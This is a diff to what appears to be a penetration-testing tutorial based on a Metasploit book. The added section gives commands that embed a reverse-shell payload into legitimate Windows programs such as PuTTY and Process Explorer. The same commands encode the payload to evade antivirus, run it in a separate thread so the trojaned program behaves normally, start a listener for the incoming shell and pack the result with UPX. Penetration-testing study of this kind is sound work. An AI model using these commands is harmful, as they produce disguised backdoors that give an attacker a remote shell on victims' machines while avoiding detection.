@@ -561,10 +561,37 @@ cd work/
 unzip ../ProcessExplorer.zip
 cd..
 msfpayload windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=31337 R | msfencode -t exe -x work/procexp.exe -o /var/www/pe_backdoor.exe -e x86/shikata_ga_nai -c 5
-msfcli exploit/multi/handler PAYLOAD=windows
+msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.1.101 LPORT=8080 E
+~~~~~~
 
+On the last line, we start the multihandler via *msfcli* to listen to the incoming connection. This is it, we opened a shell without being detected by an AV.\\
+
+## Customized executables
+{:style="color:DarkRed; font-size: 170%;"}
+
+In the book, they also explain how to execute a payload in a different thread: this allows the application to work normally (because so far, when we execute a backdoor executable, nothing seems to happen for the user and it is suspicious). Let's look at an example:
+
+~~~~
+wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+msfpayload windows/shell_reverse_tcp LHOST  192.168.1.101 LPORT=8080 R | msfencode -t exe -x putty.exe -o /var/www/putty_backdoor.exe -e x86/shikata_ga_nai -k -c 5
+~~~~~~
+
+Here, we first downloaded the Windows SSH client PuTTY and access it with the flag *k*. This latter configures the payload to execute it in a separate thread from the original executable. This ensures the application works normally while the payload is getting executed.
+
+## Packers
+{:style="color:DarkRed; font-size: 170%;"}
+
+Packers are tools which compress and encrypt an executable all at once. Let's look at an example with the famous **UPX** packer:
+
+~~~~
+apt-get install upx
+upx
+upx -5 /var/www/payload3.exe
+~~~~~~
 
 # Client side attacks exploitation
+
+WIP
 
 # Metasploit : auxiliary modules
 
